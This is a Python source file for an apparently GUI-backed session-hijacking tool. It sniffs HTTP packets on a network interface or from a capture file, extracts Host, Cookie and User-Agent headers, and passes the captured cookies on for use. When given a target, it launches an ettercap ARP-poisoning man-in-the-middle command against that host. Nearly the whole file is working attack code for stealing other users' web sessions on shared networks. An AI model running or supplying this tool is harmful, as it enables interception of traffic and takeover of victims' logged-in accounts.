#!/usr/bin/python
# -*- coding: iso-8859-1 -*-
#this bitch is GPL

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import sys, subprocess, urllib, time
from PyQt4.QtCore import *
from PyQt4.QtGui import *
from PyQt4.QtWebKit import *
from PyQt4.QtNetwork import *
import thread
from multiprocessing import Queue, Pipe, Process
import getopt

class MonsterCore(QThread):
	"""docstring for MonsterCore"""
	filename = False
	interface = False
	arp_target = False

	attacked = set()
	cookies = []
	parent_conn = None
	
	def __init__(self, filename, interface, arp_target):
		super(MonsterCore, self).__init__()
		self.filename = filename
		self.interface = interface
		self.arp_target = arp_target
		self.my_ip = str(IP(dst="8.8.8.8").src)
		if filename:
			print " [info] reading packets in " +filename
		if interface:
			print " [info] IP address on "+interface+" is set to "+self.my_ip
			print " [info] Listening for HTTP traffic on "+interface
		
	
	def extractheader(self, data, header):
	
		for line in data.split("\n"):
			if line.startswith(header): #and (line.endswith("\r") or line.endswith("\n")):
				line = line.strip()
				line = line.split("GET")[0]
				line = line.split("POST")[0]
				return line[len(header+": "):]
		return ""

	def ontothosepackets(self, pkt):
		if not IP in pkt:
			print "not IP!"
			return

		if not TCP in pkt:
			return

		data = str(pkt['TCP'].payload)
		
		if (len(data.split("Cookie"))<1): return

		host = self.extractheader(data, "Host")
		cookie = self.extractheader(data, "Cookie")
		source = str(pkt['IP'].src)
		useragent = self.extractheader(data,"User-Agent")		
		if Ether in pkt:
			ssid = "Ether"
		else:
			'''to save calculation time, just assume ssid is in first Dot11Elt
			<Dot11Elt  ID=SSID len=14 info='MERCURY_xxxxx'''
			if Dot11Elt in pkt:
				ssid = pkt[Dot11Elt][0].info
			else:
				ssid = "Unknown"
		if host and cookie and self.my_ip != None:
			print "Cookie found"
			self.emit(SIGNAL("cookieFound"),(ssid,source,host),cookie,useragent)
			#self.model.addCookie(("ASUS",source,host), cookie)
			#self.attack(source, host, cookie, useragent)
		return
	
	
	def printcookiejar(self):
		olddomain = ""
		print " [info] cookiejar so far ======================================\n"
		for cookie in self.cookies:
			if (cookie.domain() != olddomain): 
				print " \n  for domain: " + cookie.domain()
				olddomain = cookie.domain()
			print "\t cookiename: " + cookie.name()
		print "\n\n =============================================================="
	
	
	def inthemiddle(self):
		
		ettercap_command = "ettercap -oD -M arp:remote /"+str(self.arp_target)+"/ -i " + self.interface
		os.popen(ettercap_command)
		return
	
	
	def handlepkt(self, pkt):
		self.ontothosepackets(pkt)
		'''@todo: handle internal links, see 
		http://stackoverflow.com/questions/6951199/qwebview-doesnt-open-links-in-new-window-and-not-start-external-application-for 
		by flankerhqd017@gmailc.om''' 
	
	def sniff(self):
		'''@todo: maybe we can let user specify more ports to listen on '''
		if self.filename:
			sniff(offline=self.filename, prn=self.handlepkt,filter="tcp port http", store=0)
		elif self.interface:
			if self.arp_target:
				self.inthemiddle()
			self.handleMonitor()

	def handleMonitor(self):
		sniff(self.interface, prn=self.handlepkt,filter="tcp port http", store=0)
	def run(self):
		self.sniff()


			




	
